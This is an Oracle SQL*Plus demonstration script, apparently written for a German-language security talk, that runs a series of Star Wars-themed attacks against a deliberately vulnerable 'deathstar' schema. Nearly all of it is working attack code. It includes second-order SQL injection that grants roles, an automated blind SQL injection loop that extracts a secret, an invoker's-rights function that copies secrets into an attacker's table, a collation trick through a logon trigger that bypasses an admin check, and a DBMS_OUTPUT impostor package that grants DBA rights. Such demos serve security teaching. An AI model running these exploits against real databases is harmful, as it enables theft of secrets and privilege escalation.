set linesize 111
set pagesize 1000
set trimout on
column name format a30
column code format a60
column USERNAME format a30
column USER_NAME format a30
column GRANTED_ROLE format a30
column SECRET format a50
column CREATED format a30
column MESSAGE format a60
alter session set nls_date_format='dd.MM.yyyy hh:mi:ss';

cl scr
#pause
-- Poison the deathstar_rooms table
update deathstar_rooms set code = 'VADER''); insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in (''Rebel' where id = 2;
commit;
cl scr
set echo on
------------------------------------------------------------------------------------
-- Episode 2: Angriff der Blind-Injections
------------------------------------------------------------------------------------

connect deathstar/deathstar

select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
#pause
/* Wird zu:
select * from deathstar_rooms
   where lower(name) like lower('%')
   and exists(select 1 from imperial_secrets where id = 1
     and lower(substr(secret, 1, 1)) = 'a') --
 */
#pause
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
#pause
select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
#pause

select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') result from dual;
#pause

set serveroutput on
cl scr

declare
  l_secret varchar2(4000);

  function chk_char(i_idx integer)
    return varchar2
  as
    l_malicious_stmt varchar2(4000);
  begin
    for char_ascii in 1..90
      loop
        l_malicious_stmt :=
            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
        if (deathstar.room_info.get_room_id(l_malicious_stmt) = 1) then
          return chr(char_ascii);
        end if;
      end loop;
    return '?';
  end chk_char;
#pause
  
begin
  begin
    for idx in 1..30
      loop
        l_secret := l_secret || chk_char(idx);
      end loop;
  exception
    when others then
      dbms_output.put_line(sqlerrm);
  end;
  dbms_output.put_line('Secret: ' || l_secret);
#pause
end;
/
#pause

#pause/**/
cl scr
------------------------------------------------------------------------------------
-- Episode 3: Die Rache des Room-Codes
------------------------------------------------------------------------------------

connect deathstar/deathstar

select code from deathstar.deathstar_rooms;
#pause
cl scr
/* Auszug aus ALLOW_ROOM_ACCESS:
execute immediate '
  begin
    insert into ' || dbms_assert.simple_sql_name(l_log_table) || ' ( message )
      values (''User ' || i_user_id ||
      ' has now access to room ' || l_room_code || ''');
  end;
';
 */

#pause
cl scr
select * from deathstar.user_roles;
select * from deathstar.users;
#pause
call deathstar.room_info.allow_room_access(2, 1);
#pause
select * from deathstar.user_roles;
#pause
select * from deathstar.log_201911;
#pause

#pause/**/
cl scr
------------------------------------------------------------------------------------
-- Episode 4: Invoker’s Hoffnung
------------------------------------------------------------------------------------


connect sabine/sabine
#pause
cl scr
create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

#pause
cl scr
create or replace function bad_func
  return varchar2 authid current_user -- Invoker's rights!
  as
    pragma autonomous_transaction;
  begin
    execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
    commit;
    return 'Y';
  end;
/

grant execute on bad_func to public;
grant insert on secret_dump to public;
#pause
cl scr

truncate table secret_dump;
select * from secret_dump;
#pause
cl scr

select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
/* Wird zu:
select * from deathstar_rooms
   where lower(name) like lower('%')
   and sabine.bad_func() = 'Y' --
 */
#pause

select * from secret_dump;
#pause

#pause/**/
cl scr
------------------------------------------------------------------------------------
-- Episode 6: Die Rückkehr des Social Engineers
------------------------------------------------------------------------------------

ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;
#pause
select deathstar.is_admin('aDMIN') from dual;
select deathstar.is_admin('Ädmin') from dual;

#pause/**/

cl scr
create or replace trigger trg_client_detection
after logon
on database
begin
  execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
end;
/
#pause
cl scr
connect deathstar/deathstar
#pause
select is_admin('Ädmin') from dual;
#pause
cl scr

------------------------------------------------------------------------------------
-- Episode 7: Das Erwachen des Rebellen-DBAs
------------------------------------------------------------------------------------

connect sabine/sabine

create or replace package malicious_dbms_output authid current_user as
  procedure put_line( i_input varchar2 );
end;
/
#pause
cl scr

create or replace package body malicious_dbms_output as

  procedure grant_us_dba
  as
    pragma autonomous_transaction;
    begin
      execute immediate 'grant dba to sabine';
      sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
    exception when others then
      sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
      null;
    end;

  procedure put_line( i_input varchar2 )
  as
    begin
      grant_us_dba();
      sys.dbms_output.put_line(i_input);
    end;
end;
/
#pause

grant execute on malicious_dbms_output to public;
#pause
cl scr
select username, granted_role from user_role_privs;
#pause/**/

create synonym deathstar.dbms_output for malicious_dbms_output;
create synonym darth_dba.dbms_output for malicious_dbms_output;
#pause

set serveroutput on
select deathstar.room_info.get_room_id('Vader') from dual;
#pause
cl scr

--     _____                                             __     __)
--    (, /  |              . .    /)                    (, /|  /|
--     ./-- | ___     __   _   _ (/   _  _/_  _ __        / | / |  _____  _    _ __
--   ) /    |_// (_   / (_(_(_(__/ )_/_)_(___(/_/ (_   ) /  |/  |_(_)/ (_(_/__(/_/ (_
--  (_/                                               (_/   '           .-/
--                                                                     (_/

#pause/**/


select username, granted_role from user_role_privs;
